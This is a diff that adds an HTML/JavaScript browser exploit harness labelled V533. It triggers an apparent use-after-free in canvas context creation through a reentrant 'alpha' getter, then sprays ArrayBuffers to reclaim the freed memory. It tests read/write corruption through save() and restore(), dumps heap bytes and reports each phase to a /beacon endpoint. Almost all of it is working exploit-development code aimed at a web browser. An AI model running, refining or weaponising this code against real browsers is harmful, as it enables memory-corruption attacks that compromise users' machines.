@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V533</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<div id="log">V533 — Canvas UAF fast + error trapping
+Loading...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V533-'+tag,false);
+  x.setRequestHeader('Content-Type','text/plain');x.send(msg)}catch(e){}
+}
+
+window.onerror=function(m,s,l,c,e){B('ONERROR',m+' at '+s+':'+l+':'+c)};
+window.onunhandledrejection=function(ev){B('UNHANDLED',ev.reason)};
+
+B('BOOT',navigator.userAgent);
+
+var CTX_SIZE = 768;
+var SAVE_OFFSET = 592;
+
+// === Phase 1: UAF trigger + immediate spray + immediate save ===
+// All in one setTimeout to minimize gap where GC can run
+setTimeout(function(){
+  try{
+    B('P1-START','trigger+spray+save in one frame');
+
+    // Step 1: Trigger UAF
+    var canvas = document.createElement('canvas');
+    canvas.width = 1; canvas.height = 1;
+    var innerCtx = null;
+    var settings = {};
+    Object.defineProperty(settings, 'alpha', {
+      get: function() {
+        innerCtx = canvas.getContext('2d');
+        return true;
+      }
+    });
+    var outerCtx = canvas.getContext('bitmaprenderer', settings);
+
+    if (!innerCtx) {
+      B('P1-NO-CTX','inner ctx not created');
+      return;
+    }
+    B('P1-UAF','triggered, innerCtx exists');
+
+    // Step 2: Spray immediately (same task, no GC opportunity)
+    var spray = [];
+    for (var i = 0; i < 2000; i++) {
+      spray.push(new ArrayBuffer(CTX_SIZE));
+    }
+    B('P1-SPRAYED','n='+spray.length);
+
+    // Step 3: Call save() immediately
+    try {
+      innerCtx.save();
+      B('P1-SAVE-OK','save() completed');
+    } catch(e) {
+      B('P1-SAVE-ERR',''+e);
+    }
+
+    // Step 4: Scan for the hit
+    var found = [];
+    for (var i = 0; i < spray.length; i++) {
+      var u32 = new Uint32Array(spray[i], SAVE_OFFSET, 1);
+      if (u32[0] !== 0) {
+        found.push({idx: i, val: u32[0]});
+      }
+    }
+    B('P1-SCAN','found='+found.length+' ABs with nonzero at +'+SAVE_OFFSET);
+
+    if (found.length > 0) {
+      for (var j = 0; j < Math.min(5, found.length); j++) {
+        B('P1-HIT','idx='+found[j].idx+' val=0x'+found[j].val.toString(16));
+      }
+
+      // Step 5: Verify with second save()
+      var targetIdx = found[0].idx;
+      innerCtx.save();
+      var u32v = new Uint32Array(spray[targetIdx], SAVE_OFFSET, 1);
+      B('P1-VERIFY','second save: val='+u32v[0]+' (expected 2)');
+
+      if (u32v[0] === 2) {
+        B('P1-CONFIRMED','AB RECLAIM CONFIRMED — bidirectional at +'+SAVE_OFFSET);
+
+        // Step 6: Full bidirectional test
+        u32v[0] = 100;
+        innerCtx.save();
+        B('P1-BIDIR-W','set 100, save()→'+u32v[0]+' (expect 101)');
+
+        u32v[0] = 50;
+        innerCtx.restore();
+        B('P1-BIDIR-R','set 50, restore()→'+u32v[0]+' (expect 49)');
+
+        // Step 7: Dump layout bytes
+        var view = new DataView(spray[targetIdx]);
+        var regions = [[0,64],[128,192],[576,640],[704,768]];
+        for (var r = 0; r < regions.length; r++) {
+          var hex = [];
+          for (var b = regions[r][0]; b < regions[r][1]; b++) {
+            hex.push(('0'+view.getUint8(b).toString(16)).slice(-2));
+          }
+          B('P1-DUMP','['+regions[r][0]+'-'+regions[r][1]+']: '+hex.join(' '));
+        }
+      }
+
+      window._innerCtx = innerCtx;
+      window._spray = spray;
+      window._targetIdx = targetIdx;
+      window._canvas = canvas;
+    } else {
+      B('P1-MISS','no AB hit at +'+SAVE_OFFSET);
+
+      // Scan ALL offsets 0-764 in steps of 4 for any nonzero
+      B('P1-FULLSCAN','scanning all offsets...');
+      var anyHit = false;
+      for (var off = 0; off < CTX_SIZE; off += 4) {
+        for (var i = 0; i < spray.length; i++) {
+          var u = new Uint32Array(spray[i], off, 1);
+          if (u[0] !== 0) {
+            B('P1-FOUND','AB['+i+'] offset='+off+' val=0x'+u[0].toString(16));
+            anyHit = true;
+            break;
+          }
+        }
+        if (anyHit) break;
+      }
+      if (!anyHit) {
+        B('P1-ZERO','ALL ABs are entirely zero — slot NOT reclaimed');
+      }
+    }
+
+  } catch(e) { B('P1-ERR',''+e); }
+}, 200);
+
+// === Phase 2: Try with GC force before spray ===
+setTimeout(function(){
+  try{
+    if (window._targetIdx !== undefined) { B('P2-SKIP','already found in P1'); return; }
+    B('P2-START','retry with GC pressure before spray');
+
+    var canvas2 = document.createElement('canvas');
+    canvas2.width = 1; canvas2.height = 1;
+    var ctx2 = null;
+    var s2 = {};
+    Object.defineProperty(s2, 'alpha', {
+      get: function() { ctx2 = canvas2.getContext('2d'); return true; }
+    });
+    canvas2.getContext('bitmaprenderer', s2);
+
+    if (!ctx2) { B('P2-NO-CTX','failed'); return; }
+    B('P2-UAF','triggered');
+
+    // GC pressure: allocate and discard to push freed block onto free list
+    var garbage = [];
+    for (var i = 0; i < 500; i++) garbage.push(new ArrayBuffer(CTX_SIZE));
+    garbage = null;
+
+    // Now spray fresh ABs to reclaim
+    var spray2 = [];
+    for (var i = 0; i < 3000; i++) {
+      spray2.push(new ArrayBuffer(CTX_SIZE));
+    }
+    B('P2-SPRAYED','n='+spray2.length);
+
+    try {
+      ctx2.save();
+      B('P2-SAVE-OK','save() completed');
+    } catch(e) {
+      B('P2-SAVE-ERR',''+e);
+      return;
+    }
+
+    var found2 = [];
+    for (var i = 0; i < spray2.length; i++) {
+      var u = new Uint32Array(spray2[i], SAVE_OFFSET, 1);
+      if (u[0] !== 0) found2.push({idx:i, val:u[0]});
+    }
+    B('P2-SCAN','found='+found2.length);
+    for (var j = 0; j < Math.min(5, found2.length); j++) {
+      B('P2-HIT','idx='+found2[j].idx+' val=0x'+found2[j].val.toString(16));
+    }
+
+    if (found2.length === 0) {
+      // Full scan
+      var anyHit = false;
+      for (var off = 0; off < CTX_SIZE; off += 4) {
+        for (var i = 0; i < Math.min(100, spray2.length); i++) {
+          var u = new Uint32Array(spray2[i], off, 1);
+          if (u[0] !== 0) {
+            B('P2-FOUND','AB['+i+'] offset='+off+' val=0x'+u[0].toString(16));
+            anyHit = true;
+            break;
+          }
+        }
+        if (anyHit) break;
+      }
+      if (!anyHit) B('P2-ZERO','ALL zero again');
+    }
+
+  } catch(e) { B('P2-ERR',''+e); }
+}, 3000);
+
+// === Phase 3: Check if context is actually freed ===
+setTimeout(function(){
+  try{
+    B('P3-START','context liveness check');
+
+    var canvas3 = document.createElement('canvas');
+    canvas3.width = 1; canvas3.height = 1;
+    var ctx3 = null;
+    var s3 = {};
+    Object.defineProperty(s3, 'alpha', {
+      get: function() { ctx3 = canvas3.getContext('2d'); return true; }
+    });
+    var outer3 = canvas3.getContext('bitmaprenderer', s3);
+
+    if (!ctx3) { B('P3-NO-CTX','failed'); return; }
+
+    // Check: is the 2d context still alive (Ref<> pinned)?
+    // If save() writes to the LIVE context, no AB will see it
+    // Let's test by calling save() and checking lineWidth
+    try {
+      var lw = ctx3.lineWidth;
+      B('P3-LW','lineWidth='+lw+' (default=1)');
+    } catch(e) {
+      B('P3-LW-ERR',''+e);
+    }
+
+    try {
+      ctx3.save();
+      B('P3-SAVE','save() ok');
+    } catch(e) {
+      B('P3-SAVE-ERR',''+e);
+    }
+
+    try {
+      ctx3.lineWidth = 42.5;
+      var lw2 = ctx3.lineWidth;
+      B('P3-LW2','set 42.5, read='+lw2);
+    } catch(e) {
+      B('P3-LW2-ERR',''+e);
+    }
+
+    try {
+      ctx3.restore();
+      var lw3 = ctx3.lineWidth;
+      B('P3-LW3','after restore, lineWidth='+lw3+' (expect 1)');
+    } catch(e) {
+      B('P3-LW3-ERR',''+e);
+    }
+
+    // If all reads work with correct values, the context is ALIVE (Ref<> pinned)
+    // and the AB spray approach won't work
+    B('P3-DONE','if lineWidth reads work, context is alive (not freed)');
+
+    // Also check: does canvas.getContext('2d') return the same or different?
+    var ctx3b = canvas3.getContext('2d');
+    B('P3-REGET','getContext 2d after bitmaprenderer='+(ctx3b===null?'null':ctx3b===ctx3?'SAME':'DIFFERENT'));
+
+    // Check what context the canvas thinks it has
+    var ctx3c = canvas3.getContext('bitmaprenderer');
+    B('P3-CURRENT','getContext bitmaprenderer='+(ctx3c===null?'null':ctx3c===outer3?'SAME_OUTER':'DIFFERENT'));
+
+  } catch(e) { B('P3-ERR',''+e); }
+}, 6000);
+
+setTimeout(function(){B('COMPLETE','all phases done')},9000);
+</script></body></html>
